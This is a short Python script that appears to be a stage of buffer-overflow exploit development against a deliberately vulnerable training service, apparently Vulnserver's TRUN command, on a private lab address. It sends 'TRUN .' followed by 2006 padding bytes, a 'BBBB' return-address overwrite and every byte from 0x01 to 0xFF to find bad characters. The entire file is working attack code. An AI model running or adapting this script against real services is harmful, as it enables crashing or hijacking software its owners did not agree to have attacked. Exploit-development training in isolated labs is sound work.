import socket

s = socket.socket()
s.connect(("192.168.56.101", 9999))

offset = 2006

badchars = b"".join([bytes([i]) for i in range(1,256)])

payload  = b"TRUN ."
payload += b"A" * offset
payload += b"BBBB"
payload += badchars

s.send(payload)
s.close()
